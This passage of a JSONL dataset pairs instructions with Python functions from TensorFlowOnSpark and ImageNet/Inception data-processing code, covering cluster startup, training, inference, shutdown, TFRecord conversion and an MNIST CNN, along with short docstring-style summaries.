total_sample_count = num_iter * FLAGS.batch_size\n      step = 0\n\n      print('%s: starting evaluation on (%s).' % (datetime.now(), FLAGS.subset))\n      start_time = time.time()\n      while step < num_iter and not coord.should_stop():\n        top_1, top_5 = sess.run([top_1_op, top_5_op])\n        count_top_1 += np.sum(top_1)\n        count_top_5 += np.sum(top_5)\n        step += 1\n        if step % 20 == 0:\n          duration = time.time() - start_time\n          sec_per_batch = duration / 20.0\n          examples_per_sec = FLAGS.batch_size / sec_per_batch\n          print('%s: [%d batches out of %d] (%.1f examples/sec; %.3f'\n                'sec/batch)' % (datetime.now(), step, num_iter,\n                                examples_per_sec, sec_per_batch))\n          start_time = time.time()\n\n      # Compute precision @ 1.\n      precision_at_1 = count_top_1 / total_sample_count\n      recall_at_5 = count_top_5 / total_sample_count\n      print('%s: precision @ 1 = %.4f recall @ 5 = %.4f [%d examples]' %\n            (datetime.now(), precision_at_1, recall_at_5, total_sample_count))\n\n      summary = tf.Summary()\n      summary.ParseFromString(sess.run(summary_op))\n      summary.value.add(tag='Precision @ 1', simple_value=precision_at_1)\n      summary.value.add(tag='Recall @ 5', simple_value=recall_at_5)\n      summary_writer.add_summary(summary, global_step)\n\n    except Exception as e:  # pylint: disable=broad-except\n      coord.request_stop(e)\n\n    coord.request_stop()\n    coord.join(threads, stop_grace_period_secs=10)", "response": "Runs Eval once.\n\n  Args:\n    saver: Saver.\n    summary_writer: Summary writer.\n    top_1_op: Top 1 op.\n    top_5_op: Top 5 op.\n    summary_op: Summary op."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nevaluate model on Dataset for a number of steps.", "response": "def evaluate(dataset):\n  \"\"\"Evaluate model on Dataset for a number of steps.\"\"\"\n  with tf.Graph().as_default():\n    # Get images and labels from the dataset.\n    images, labels = image_processing.inputs(dataset)\n\n    # Number of classes in the Dataset label set plus 1.\n    # Label 0 is reserved for an (unused) background class.\n    num_classes = dataset.num_classes() + 1\n\n    # Build a Graph that computes the logits predictions from the\n    # inference model.\n    logits, _ = inception.inference(images, num_classes)\n\n    # Calculate predictions.\n    top_1_op = tf.nn.in_top_k(logits, labels, 1)\n    top_5_op = tf.nn.in_top_k(logits, labels, 5)\n\n    # Restore the moving average version of the learned variables for eval.\n    variable_averages = tf.train.ExponentialMovingAverage(\n        inception.MOVING_AVERAGE_DECAY)\n    variables_to_restore = variable_averages.variables_to_restore()\n    saver = tf.train.Saver(variables_to_restore)\n\n    # Build the summary operation based on the TF collection of Summaries.\n    summary_op = tf.summary.merge_all()\n\n    graph_def = tf.get_default_graph().as_graph_def()\n    summary_writer = tf.summary.FileWriter(FLAGS.eval_dir,\n                                            graph_def=graph_def)\n\n    while True:\n      _eval_once(saver, summary_writer, top_1_op, top_5_op, summary_op)\n      if FLAGS.run_once:\n        break\n      time.sleep(FLAGS.eval_interval_secs)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _run_model(iterator, args, tf_args):\n  single_node_env(tf_args)\n\n  logging.info(\"===== input_mapping: {}\".format(args.input_mapping))\n  logging.info(\"===== output_mapping: {}\".format(args.output_mapping))\n  input_tensor_names = [tensor for col, tensor in sorted(args.input_mapping.items())]\n  output_tensor_names = [tensor for tensor, col in sorted(args.output_mapping.items())]\n\n  # if using a signature_def_key, get input/output tensor info from the requested signature\n  if args.signature_def_key:\n    assert args.export_dir, \"Inferencing with signature_def_key requires --export_dir argument\"\n    logging.info(\"===== loading meta_graph_def for tag_set ({0}) from saved_model: {1}\".format(args.tag_set, args.export_dir))\n    meta_graph_def = get_meta_graph_def(args.export_dir, args.tag_set)\n    signature = meta_graph_def.signature_def[args.signature_def_key]\n    logging.debug(\"signature: {}\".format(signature))\n    inputs_tensor_info = signature.inputs\n    logging.debug(\"inputs_tensor_info: {0}\".format(inputs_tensor_info))\n    outputs_tensor_info = signature.outputs\n    logging.debug(\"outputs_tensor_info: {0}\".format(outputs_tensor_info))\n\n  result = []\n\n  global global_sess, global_args\n  if global_sess and global_args == args:\n    # if graph/session already loaded/started (and using same args), just reuse it\n    sess = global_sess\n  else:\n    # otherwise, create new session and load graph from disk\n    tf.reset_default_graph()\n    sess = tf.Session(graph=tf.get_default_graph())\n    if args.export_dir:\n      assert args.tag_set, \"Inferencing from a saved_model requires --tag_set\"\n      # load graph from a saved_model\n      logging.info(\"===== restoring from saved_model: {}\".format(args.export_dir))\n      loader.load(sess, args.tag_set.split(','), args.export_dir)\n    elif args.model_dir:\n      # load graph from a checkpoint\n      ckpt = tf.train.latest_checkpoint(args.model_dir)\n      assert ckpt, \"Invalid model checkpoint path: {}\".format(args.model_dir)\n      logging.info(\"===== restoring from checkpoint: {}\".format(ckpt + \".meta\"))\n      saver = tf.train.import_meta_graph(ckpt + \".meta\", clear_devices=True)\n      saver.restore(sess, ckpt)\n    else:\n      raise Exception(\"Inferencing requires either --model_dir or --export_dir argument\")\n    global_sess = sess\n    global_args = args\n\n  # get list of input/output tensors (by name)\n  if args.signature_def_key:\n    input_tensors = [inputs_tensor_info[t].name for t in input_tensor_names]\n    output_tensors = [outputs_tensor_info[output_tensor_names[0]].name]\n  else:\n    input_tensors = [t + ':0' for t in input_tensor_names]\n    output_tensors = [t + ':0' for t in output_tensor_names]\n\n  logging.info(\"input_tensors: {0}\".format(input_tensors))\n  logging.info(\"output_tensors: {0}\".format(output_tensors))\n\n  # feed data in batches and return output tensors\n  for tensors in yield_batch(iterator, args.batch_size, len(input_tensor_names)):\n    inputs_feed_dict = {}\n    for i in range(len(input_tensors)):\n      inputs_feed_dict[input_tensors[i]] = tensors[i]\n\n    outputs = sess.run(output_tensors, feed_dict=inputs_feed_dict)\n    lengths = [len(output) for output in outputs]\n    input_size = len(tensors[0])\n    assert all([length == input_size for length in lengths]), \"Output array sizes {} must match input size: {}\".format(lengths, input_size)\n    python_outputs = [output.tolist() for output in outputs]      # convert from numpy to standard python types\n    result.extend(zip(*python_outputs))                           # convert to an array of tuples of \"output columns\"\n\n  return result", "response": "mapPartitions function to run single - node inferencing from a checkpoint or saved_model."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nset up the environment for a single - node TF session.", "response": "def single_node_env(args):\n  \"\"\"Sets up environment for a single-node TF session.\n\n  Args:\n    :args: command line arguments as either argparse args or argv list\n  \"\"\"\n  # setup ARGV for the TF process\n  if isinstance(args, list):\n      sys.argv = args\n  elif args.argv:\n      sys.argv = args.argv\n\n  # setup ENV for Hadoop-compatibility and/or GPU allocation\n  num_gpus = args.num_gpus if 'num_gpus' in args else 1\n  util.single_node_env(num_gpus)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _fit(self, dataset):\n    sc = SparkContext.getOrCreate()\n\n    logging.info(\"===== 1. train args: {0}\".format(self.args))\n    logging.info(\"===== 2. train params: {0}\".format(self._paramMap))\n    local_args = self.merge_args_params()\n    logging.info(\"===== 3. train args + params: {0}\".format(local_args))\n\n    if local_args.input_mode == TFCluster.InputMode.TENSORFLOW:\n      if dfutil.isLoadedDF(dataset):\n        # if just a DataFrame loaded from tfrecords, just point to original source path\n        logging.info(\"Loaded DataFrame of TFRecord.\")\n        local_args.tfrecord_dir = dfutil.loadedDF[dataset]\n      else:\n        # otherwise, save as tfrecords and point to save path\n        assert local_args.tfrecord_dir, \"Please specify --tfrecord_dir to export DataFrame to TFRecord.\"\n        if self.getInputMapping():\n          # if input mapping provided, filter only required columns before exporting\n          dataset = dataset.select(list(self.getInputMapping()))\n        logging.info(\"Exporting DataFrame {} as TFRecord to: {}\".format(dataset.dtypes, local_args.tfrecord_dir))\n        dfutil.saveAsTFRecords(dataset, local_args.tfrecord_dir)\n        logging.info(\"Done saving\")\n\n    tf_args = self.args.argv if self.args.argv else local_args\n    cluster = TFCluster.run(sc, self.train_fn, tf_args, local_args.cluster_size, local_args.num_ps,\n                            local_args.tensorboard, local_args.input_mode, driver_ps_nodes=local_args.driver_ps_nodes)\n    if local_args.input_mode == TFCluster.InputMode.SPARK:\n      # feed data, using a deterministic order for input columns (lexicographic by key)\n      input_cols = sorted(self.getInputMapping())\n      cluster.train(dataset.select(input_cols).rdd, local_args.epochs)\n    cluster.shutdown(grace_secs=30)\n\n    # Run export function, if provided\n    if self.export_fn:\n      assert local_args.export_dir, \"Export function requires --export_dir to be set\"\n      logging.info(\"Exporting saved_model (via export_fn) to: {}\".format(local_args.export_dir))\n\n      def _export(iterator, fn, args):\n        single_node_env(args)\n        fn(args)\n\n      # Run on a single exeucutor\n      sc.parallelize([1], 1).foreachPartition(lambda it: _export(it, self.export_fn, tf_args))\n\n    return self._copyValues(TFModel(self.args))", "response": "Trains a TensorFlow model and returns a TFModel instance with the same args and params pointing to a checkpoint or saved_model on disk."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _transform(self, dataset):\n    spark = SparkSession.builder.getOrCreate()\n\n    # set a deterministic order for input/output columns (lexicographic by key)\n    input_cols = [col for col, tensor in sorted(self.getInputMapping().items())]      # input col => input tensor\n    output_cols = [col for tensor, col in sorted(self.getOutputMapping().items())]    # output tensor => output col\n\n    # run single-node inferencing on each executor\n    logging.info(\"input_cols: {}\".format(input_cols))\n    logging.info(\"output_cols: {}\".format(output_cols))\n\n    # merge args + params\n    logging.info(\"===== 1. inference args: {0}\".format(self.args))\n    logging.info(\"===== 2. inference params: {0}\".format(self._paramMap))\n    local_args = self.merge_args_params()\n    logging.info(\"===== 3. inference args + params: {0}\".format(local_args))\n\n    tf_args = self.args.argv if self.args.argv else local_args\n    rdd_out = dataset.select(input_cols).rdd.mapPartitions(lambda it: _run_model(it, local_args, tf_args))\n\n    # convert to a DataFrame-friendly format\n    rows_out = rdd_out.map(lambda x: Row(*x))\n    return spark.createDataFrame(rows_out, output_cols)", "response": "Transforms the input DataFrame by applying the _run_model function."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef run(sc, map_fun, tf_args, num_executors, num_ps, tensorboard=False, input_mode=InputMode.TENSORFLOW,\n        log_dir=None, driver_ps_nodes=False, master_node=None, reservation_timeout=600, queues=['input', 'output', 'error'],\n        eval_node=False):\n  \"\"\"Starts the TensorFlowOnSpark cluster and Runs the TensorFlow \"main\" function on the Spark executors\n\n  Args:\n    :sc: SparkContext\n    :map_fun: user-supplied TensorFlow \"main\" function\n    :tf_args: ``argparse`` args, or command-line ``ARGV``.  These will be passed to the ``map_fun``.\n    :num_executors: number of Spark executors.  This should match your Spark job's ``--num_executors``.\n    :num_ps: number of Spark executors which are reserved for TensorFlow PS nodes.  All other executors will be used as TensorFlow worker nodes.\n    :tensorboard: boolean indicating if the chief worker should spawn a Tensorboard server.\n    :input_mode: TFCluster.InputMode\n    :log_dir: directory to save tensorboard event logs.  If None, defaults to a fixed path on local filesystem.\n    :driver_ps_nodes: run the PS nodes on the driver locally instead of on the spark executors; this help maximizing computing resources (esp. GPU). You will need to set cluster_size = num_executors + num_ps\n    :master_node: name of the \"master\" or \"chief\" node in the cluster_template, used for `tf.estimator` applications.\n    :reservation_timeout: number of seconds after which cluster reservation times out (600 sec default)\n    :queues: *INTERNAL_USE*\n    :eval_node: run evaluator node for distributed Tensorflow\n\n  Returns:\n    A TFCluster object representing the started cluster.\n  \"\"\"\n  logging.info(\"Reserving TFSparkNodes {0}\".format(\"w/ TensorBoard\" if tensorboard else \"\"))\n\n  if driver_ps_nodes and input_mode != InputMode.TENSORFLOW:\n    raise Exception('running PS nodes on driver locally is only supported in InputMode.TENSORFLOW')\n\n  if eval_node and input_mode != InputMode.TENSORFLOW:\n    raise Exception('running evaluator nodes is only supported in InputMode.TENSORFLOW')\n\n  # compute size of TF cluster and validate against number of Spark executors\n  num_master = 1 if master_node else 0\n  num_eval = 1 if eval_node else 0\n  num_workers = max(num_executors - num_ps - num_eval - num_master, 0)\n  total_nodes = num_ps + num_master + num_eval + num_workers\n\n  assert total_nodes == num_executors, \"TensorFlow cluster requires {} nodes, but only {} executors available\".format(total_nodes, num_executors)\n  assert num_master + num_workers > 0, \"TensorFlow cluster requires at least one worker or master/chief node\"\n\n  # create a cluster template for scheduling TF nodes onto executors\n  executors = list(range(num_executors))\n  cluster_template = {}\n\n  if num_ps > 0:\n    cluster_template['ps'] = executors[:num_ps]\n    del executors[:num_ps]\n  if master_node:\n    cluster_template[master_node] = executors[:1]\n    del executors[:1]\n  if eval_node:\n    cluster_template['evaluator'] = executors[:1]\n    del executors[:1]\n  if num_workers > 0:\n    cluster_template['worker'] = executors[:num_workers]\n\n  logging.info(\"cluster_template: {}\".format(cluster_template))\n\n  # get default filesystem from spark\n  defaultFS = sc._jsc.hadoopConfiguration().get(\"fs.defaultFS\")\n  # strip trailing \"root\" slash from \"file:///\" to be consistent w/ \"hdfs://...\"\n  if defaultFS.startswith(\"file://\") and len(defaultFS) > 7 and defaultFS.endswith(\"/\"):\n    defaultFS = defaultFS[:-1]\n\n  # get current working dir of spark launch\n  working_dir = os.getcwd()\n\n  # start a server to listen for reservations and broadcast cluster_spec\n  server = reservation.Server(num_executors)\n  server_addr = server.start()\n\n  # start TF nodes on all executors\n  logging.info(\"Starting TensorFlow on executors\")\n  cluster_meta = {\n    'id': random.getrandbits(64),\n    'cluster_template': cluster_template,\n    'num_executors': num_executors,\n    'default_fs': defaultFS,\n    'working_dir': working_dir,\n    'server_addr': server_addr\n  }\n  if driver_ps_nodes:\n    nodeRDD = sc.parallelize(range(num_ps, num_executors), num_executors - num_ps)\n  else:\n    nodeRDD = sc.parallelize(range(num_executors), num_executors)\n\n  if driver_ps_nodes:\n    def _start_ps(node_index):\n      logging.info(\"starting ps node locally %d\" % node_index)\n      TFSparkNode.run(map_fun,\n                      tf_args,\n                      cluster_meta,\n                      tensorboard,\n                      log_dir,\n                      queues,\n                      background=(input_mode == InputMode.SPARK))([node_index])\n    for i in cluster_template['ps']:\n      ps_thread = threading.Thread(target=lambda: _start_ps(i))\n      ps_thread.daemon = True\n      ps_thread.start()\n\n  # start TF on a background thread (on Spark driver) to allow for feeding job\n  def _start(status):\n    try:\n      nodeRDD.foreachPartition(TFSparkNode.run(map_fun,\n                                                tf_args,\n                                                cluster_meta,\n                                                tensorboard,\n                                                log_dir,\n                                                queues,\n                                                background=(input_mode == InputMode.SPARK)))\n    except Exception as e:\n      logging.error(\"Exception in TF background thread\")\n      status['error'] = str(e)\n\n  t = threading.Thread(target=_start, args=(tf_status,))\n  # run as daemon thread so that in spark mode main thread can exit\n  # if feeder spark stage fails and main thread can't do explicit shutdown\n  t.daemon = True\n  t.start()\n\n  # wait for executors to register and start TFNodes before continuing\n  logging.info(\"Waiting for TFSparkNodes to start\")\n  cluster_info = server.await_reservations(sc, tf_status, reservation_timeout)\n  logging.info(\"All TFSparkNodes started\")\n\n  # print cluster_info and extract TensorBoard URL\n  tb_url = None\n  for node in cluster_info:\n    logging.info(node)\n    if node['tb_port'] != 0:\n      tb_url = \"http://{0}:{1}\".format(node['host'], node['tb_port'])\n\n  if tb_url is not None:\n    logging.info(\"========================================================================================\")\n    logging.info(\"\")\n    logging.info(\"TensorBoard running at:       {0}\".format(tb_url))\n    logging.info(\"\")\n    logging.info(\"========================================================================================\")\n\n  # since our \"primary key\" for each executor's TFManager is (host, executor_id), sanity check for duplicates\n  # Note: this may occur if Spark retries failed Python tasks on the same executor.\n  tb_nodes = set()\n  for node in cluster_info:\n    node_id = (node['host'], node['executor_id'])\n    if node_id in tb_nodes:\n      msg = '''\nDuplicate cluster node id detected (host={0}, executor_id={1})\nPlease ensure that:\n1. Number of executors >= number of TensorFlow nodes\n2. Number of tasks per executors is 1\n3, TFCluster.shutdown() is successfully invoked when done.\n'''.strip()\n      raise Exception(msg.format(node_id[0], node_id[1]))\n    else:\n      tb_nodes.add(node_id)\n\n  # create TFCluster object\n  cluster = TFCluster()\n  cluster.sc = sc\n  cluster.meta = cluster_meta\n  cluster.nodeRDD = nodeRDD\n  cluster.cluster_info = cluster_info\n  cluster.cluster_meta = cluster_meta\n  cluster.input_mode = input_mode\n  cluster.queues = queues\n  cluster.server = server\n\n  return cluster", "response": "Starts the TensorFlowOnSpark cluster and runs the main function on Spark executors."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef train(self, dataRDD, num_epochs=0, feed_timeout=600, qname='input'):\n    logging.info(\"Feeding training data\")\n    assert self.input_mode == InputMode.SPARK, \"TFCluster.train() requires InputMode.SPARK\"\n    assert qname in self.queues, \"Unknown queue: {}\".format(qname)\n    assert num_epochs >= 0, \"num_epochs cannot be negative\"\n\n    if isinstance(dataRDD, DStream):\n      # Spark Streaming\n      dataRDD.foreachRDD(lambda rdd: rdd.foreachPartition(TFSparkNode.train(self.cluster_info, self.cluster_meta, feed_timeout=feed_timeout, qname=qname)))\n    else:\n      # Spark RDD\n      # if num_epochs unspecified, pick an arbitrarily \"large\" number for now\n      # TODO: calculate via dataRDD.count() / batch_size / max_steps\n      if num_epochs == 0:\n        num_epochs = 10\n      rdds = [dataRDD] * num_epochs\n      unionRDD = self.sc.union(rdds)\n      unionRDD.foreachPartition(TFSparkNode.train(self.cluster_info, self.cluster_meta, feed_timeout=feed_timeout, qname=qname))", "response": "Train the cluster on the input data."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef inference(self, dataRDD, feed_timeout=600, qname='input'):\n    logging.info(\"Feeding inference data\")\n    assert self.input_mode == InputMode.SPARK, \"TFCluster.inference() requires InputMode.SPARK\"\n    assert qname in self.queues, \"Unknown queue: {}\".format(qname)\n    return dataRDD.mapPartitions(TFSparkNode.inference(self.cluster_info, feed_timeout=feed_timeout, qname=qname))", "response": "Feeds the data into the TensorFlow worker nodes and returns an RDD of the inference results."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef shutdown(self, ssc=None, grace_secs=0, timeout=259200):\n    logging.info(\"Stopping TensorFlow nodes\")\n\n    # identify ps/workers\n    ps_list, worker_list, eval_list = [], [], []\n    for node in self.cluster_info:\n      (ps_list if node['job_name'] == 'ps' else eval_list if node['job_name'] == 'evaluator' else worker_list).append(node)\n\n    # setup execution timeout\n    if timeout > 0:\n      def timeout_handler(signum, frame):\n        logging.error(\"TensorFlow execution timed out, exiting Spark application with error status\")\n        self.sc.cancelAllJobs()\n        self.sc.stop()\n        sys.exit(1)\n\n      signal.signal(signal.SIGALRM, timeout_handler)\n      signal.alarm(timeout)\n\n    # wait for Spark Streaming termination or TF app completion for InputMode.TENSORFLOW\n    if ssc is not None:\n      # Spark Streaming\n      while not ssc.awaitTerminationOrTimeout(1):\n        if self.server.done:\n          logging.info(\"Server done, stopping StreamingContext\")\n          ssc.stop(stopSparkContext=False, stopGraceFully=True)\n          break\n    elif self.input_mode == InputMode.TENSORFLOW:\n      # in TENSORFLOW mode, there is no \"data feeding\" job, only a \"start\" job, so we must wait for the TensorFlow workers\n      # to complete all tasks, while accounting for any PS tasks which run indefinitely.\n      count = 0\n      while count < 3:\n        st = self.sc.statusTracker()\n        jobs = st.getActiveJobsIds()\n        if len(jobs) == 0:\n          break\n        stages = st.getActiveStageIds()\n        for i in stages:\n          si = st.getStageInfo(i)\n          if si.numActiveTasks == len(ps_list) + len(eval_list):\n            # if we only have PS tasks left, check that we see this condition a couple times\n            count += 1\n        time.sleep(5)\n\n    # shutdown queues and managers for \"worker\" executors.\n    # note: in SPARK mode, this job will immediately queue up behind the \"data feeding\" job.\n    # in TENSORFLOW mode, this will only run after all workers have finished.\n    workers = len(worker_list)\n    workerRDD = self.sc.parallelize(range(workers), workers)\n    workerRDD.foreachPartition(TFSparkNode.shutdown(self.cluster_info, self.queues))\n    time.sleep(grace_secs)\n\n    # exit Spark application w/ err status if TF job had any errors\n    if 'error' in tf_status:\n      logging.error(\"Exiting Spark application with error status.\")\n      self.sc.cancelAllJobs()\n      self.sc.stop()\n      sys.exit(1)\n\n    logging.info(\"Shutting down cluster\")\n    # shutdown queues and managers for \"PS\" executors.\n    # note: we have to connect/shutdown from the spark driver, because these executors are \"busy\" and won't accept any other tasks.\n    for node in ps_list + eval_list:\n      addr = node['addr']\n      authkey = node['authkey']\n      m = TFManager.connect(addr, authkey)\n      q = m.get_queue('control')\n      q.put(None)\n      q.join()\n\n    # wait for all jobs to finish\n    while True:\n      time.sleep(5)\n      st = self.sc.statusTracker()\n      jobs = st.getActiveJobsIds()\n      if len(jobs) == 0:\n        break", "response": "Stops the distributed TensorFlow cluster."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _int64_feature(value):\n  if not isinstance(value, list):\n    value = [value]\n  return tf.train.Feature(int64_list=tf.train.Int64List(value=value))", "response": "Wrapper for inserting int64 features into Example proto."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nwrap for inserting float features into Example proto.", "response": "def _float_feature(value):\n  \"\"\"Wrapper for inserting float features into Example proto.\"\"\"\n  if not isinstance(value, list):\n    value = [value]\n  return tf.train.Feature(float_list=tf.train.FloatList(value=value))"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _convert_to_example(filename, image_buffer, label, synset, human, bbox,\n                        height, width):\n  \"\"\"Build an Example proto for an example.\n\n  Args:\n    filename: string, path to an image file, e.g., '/path/to/example.JPG'\n    image_buffer: string, JPEG encoding of RGB image\n    label: integer, identifier for the ground truth for the network\n    synset: string, unique WordNet ID specifying the label, e.g., 'n02323233'\n    human: string, human-readable label, e.g., 'red fox, Vulpes vulpes'\n    bbox: list of bounding boxes; each box is a list of integers\n      specifying [xmin, ymin, xmax, ymax]. All boxes are assumed to belong to\n      the same label as the image label.\n    height: integer, image height in pixels\n    width: integer, image width in pixels\n  Returns:\n    Example proto\n  \"\"\"\n  xmin = []\n  ymin = []\n  xmax = []\n  ymax = []\n  for b in bbox:\n    assert len(b) == 4\n    # pylint: disable=expression-not-assigned\n    [l.append(point) for l, point in zip([xmin, ymin, xmax, ymax], b)]\n    # pylint: enable=expression-not-assigned\n\n  colorspace = 'RGB'\n  channels = 3\n  image_format = 'JPEG'\n\n  example = tf.train.Example(features=tf.train.Features(feature={\n      'image/height': _int64_feature(height),\n      'image/width': _int64_feature(width),\n      'image/colorspace': _bytes_feature(colorspace),\n      'image/channels': _int64_feature(channels),\n      'image/class/label': _int64_feature(label),\n      'image/class/synset': _bytes_feature(synset),\n      'image/class/text': _bytes_feature(human),\n      'image/object/bbox/xmin': _float_feature(xmin),\n      'image/object/bbox/xmax': _float_feature(xmax),\n      'image/object/bbox/ymin': _float_feature(ymin),\n      'image/object/bbox/ymax': _float_feature(ymax),\n      'image/object/bbox/label': _int64_feature([label] * len(xmin)),\n      'image/format': _bytes_feature(image_format),\n      'image/filename': _bytes_feature(os.path.basename(filename)),\n      'image/encoded': _bytes_feature(image_buffer)}))\n  return example", "response": "Convert an image file to an example."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _process_image(filename, coder):\n  # Read the image file.\n  with tf.gfile.FastGFile(filename, 'r') as f:\n    image_data = f.read()\n\n  # Clean the dirty data.\n  if _is_png(filename):\n    # 1 image is a PNG.\n    print('Converting PNG to JPEG for %s' % filename)\n    image_data = coder.png_to_jpeg(image_data)\n  elif _is_cmyk(filename):\n    # 22 JPEG images are in CMYK colorspace.\n    print('Converting CMYK to RGB for %s' % filename)\n    image_data = coder.cmyk_to_rgb(image_data)\n\n  # Decode the RGB JPEG.\n  image = coder.decode_jpeg(image_data)\n\n  # Check that image converted to RGB\n  assert len(image.shape) == 3\n  height = image.shape[0]\n  width = image.shape[1]\n  assert image.shape[2] == 3\n\n  return image_data, height, width", "response": "Process a single image file."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nfinds the human - readable labels for a list of strings.", "response": "def _find_human_readable_labels(synsets, synset_to_human):\n  \"\"\"Build a list of human-readable labels.\n\n  Args:\n    synsets: list of strings; each string is a unique WordNet ID.\n    synset_to_human: dict of synset to human labels, e.g.,\n      'n02119022' --> 'red fox, Vulpes vulpes'\n\n  Returns:\n    List of human-readable strings corresponding to each synset.\n  \"\"\"\n  humans = []\n  for s in synsets:\n    assert s in synset_to_human, ('Failed to find: %s' % s)\n    humans.append(synset_to_human[s])\n  return humans"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nfind the bounding boxes for a given image file.", "response": "def _find_image_bounding_boxes(filenames, image_to_bboxes):\n  \"\"\"Find the bounding boxes for a given image file.\n\n  Args:\n    filenames: list of strings; each string is a path to an image file.\n    image_to_bboxes: dictionary mapping image file names to a list of\n      bounding boxes. This list contains 0+ bounding boxes.\n  Returns:\n    List of bounding boxes for each image. Note that each entry in this\n    list might contain from 0+ entries corresponding to the number of bounding\n    box annotations for the image.\n  \"\"\"\n  num_image_bbox = 0\n  bboxes = []\n  for f in filenames:\n    basename = os.path.basename(f)\n    if basename in image_to_bboxes:\n      bboxes.append(image_to_bboxes[basename])\n      num_image_bbox += 1\n    else:\n      bboxes.append([])\n  print('Found %d images with bboxes out of %d images' % (\n      num_image_bbox, len(filenames)))\n  return bboxes"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _process_dataset(name, directory, num_shards, synset_to_human,\n                     image_to_bboxes):\n  \"\"\"Process a complete data set and save it as a TFRecord.\n\n  Args:\n    name: string, unique identifier specifying the data set.\n    directory: string, root path to the data set.\n    num_shards: integer number of shards for this data set.\n    synset_to_human: dict of synset to human labels, e.g.,\n      'n02119022' --> 'red fox, Vulpes vulpes'\n    image_to_bboxes: dictionary mapping image file names to a list of\n      bounding boxes. This list contains 0+ bounding boxes.\n  \"\"\"\n  filenames, synsets, labels = _find_image_files(directory, FLAGS.labels_file)\n  humans = _find_human_readable_labels(synsets, synset_to_human)\n  bboxes = _find_image_bounding_boxes(filenames, image_to_bboxes)\n  _process_image_files(name, filenames, synsets, labels,\n                       humans, bboxes, num_shards)", "response": "Process a complete data set and save it as a TFRecord."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nbuild a dictionary of synset to human - readable label.", "response": "def _build_synset_lookup(imagenet_metadata_file):\n  \"\"\"Build lookup for synset to human-readable label.\n\n  Args:\n    imagenet_metadata_file: string, path to file containing mapping from\n      synset to human-readable label.\n\n      Assumes each line of the file looks like:\n\n        n02119247    black fox\n        n02119359    silver fox\n        n02119477    red fox, Vulpes fulva\n\n      where each line corresponds to a unique mapping. Note that each line is\n      formatted as <synset>\\t<human readable label>.\n\n  Returns:\n    Dictionary of synset to human labels, such as:\n      'n02119022' --> 'red fox, Vulpes vulpes'\n  \"\"\"\n  lines = tf.gfile.FastGFile(imagenet_metadata_file, 'r').readlines()\n  synset_to_human = {}\n  for l in lines:\n    if l:\n      parts = l.strip().split('\\t')\n      assert len(parts) == 2\n      synset = parts[0]\n      human = parts[1]\n      synset_to_human[synset] = human\n  return synset_to_human"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nbuilds a lookup from image file to bounding boxes.", "response": "def _build_bounding_box_lookup(bounding_box_file):\n  \"\"\"Build a lookup from image file to bounding boxes.\n\n  Args:\n    bounding_box_file: string, path to file with bounding boxes annotations.\n\n      Assumes each line of the file looks like:\n\n        n00007846_64193.JPEG,0.0060,0.2620,0.7545,0.9940\n\n      where each line corresponds to one bounding box annotation associated\n      with an image. Each line can be parsed as:\n\n        <JPEG file name>, <xmin>, <ymin>, <xmax>, <ymax>\n\n      Note that there might exist mulitple bounding box annotations associated\n      with an image file. This file is the output of process_bounding_boxes.py.\n\n  Returns:\n    Dictionary mapping image file names to a list of bounding boxes. This list\n    contains 0+ bounding boxes.\n  \"\"\"\n  lines = tf.gfile.FastGFile(bounding_box_file, 'r').readlines()\n  images_to_bboxes = {}\n  num_bbox = 0\n  num_image = 0\n  for l in lines:\n    if l:\n      parts = l.split(',')\n      assert len(parts) == 5, ('Failed to parse: %s' % l)\n      filename = parts[0]\n      xmin = float(parts[1])\n      ymin = float(parts[2])\n      xmax = float(parts[3])\n      ymax = float(parts[4])\n      box = [xmin, ymin, xmax, ymax]\n\n      if filename not in images_to_bboxes:\n        images_to_bboxes[filename] = []\n        num_image += 1\n      images_to_bboxes[filename].append(box)\n      num_bbox += 1\n\n  print('Successfully read %d bounding boxes '\n        'across %d images.' % (num_bbox, num_image))\n  return images_to_bboxes"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nmodeling function for CNN.", "response": "def cnn_model_fn(features, labels, mode):\n  \"\"\"Model function for CNN.\"\"\"\n  # Input Layer\n  # Reshape X to 4-D tensor: [batch_size, width, height, channels]\n  # MNIST images are 28x28 pixels, and have one color channel\n  input_layer = tf.reshape(features[\"x\"], [-1, 28, 28, 1])\n\n  # Convolutional Layer #1\n  # Computes 32 features using a 5x5 filter with ReLU activation.\n  # Padding is added to preserve width and height.\n  # Input Tensor Shape: [batch_size, 28, 28, 1]\n  # Output Tensor Shape: [batch_size, 28, 28, 32]\n  conv1 = tf.layers.conv2d(\n      inputs=input_layer,\n      filters=32,\n      kernel_size=[5, 5],\n      padding=\"same\",\n      activation=tf.nn.relu)\n\n  # Pooling Layer #1\n  # First max pooling layer with a 2x2 filter and stride of 2\n  # Input Tensor Shape: [batch_size, 28, 28, 32]\n  # Output Tensor Shape: [batch_size, 14, 14, 32]\n  pool1 = tf.layers.max_pooling2d(inputs=conv1, pool_size=[2, 2], strides=2)\n\n  # Convolutional Layer #2\n  # Computes 64 features using a 5x5 filter.\n  # Padding is added to preserve width and height.\n  # Input Tensor Shape: [batch_size, 14, 14, 32]\n  # Output Tensor Shape: [batch_size, 14, 14, 64]\n  conv2 = 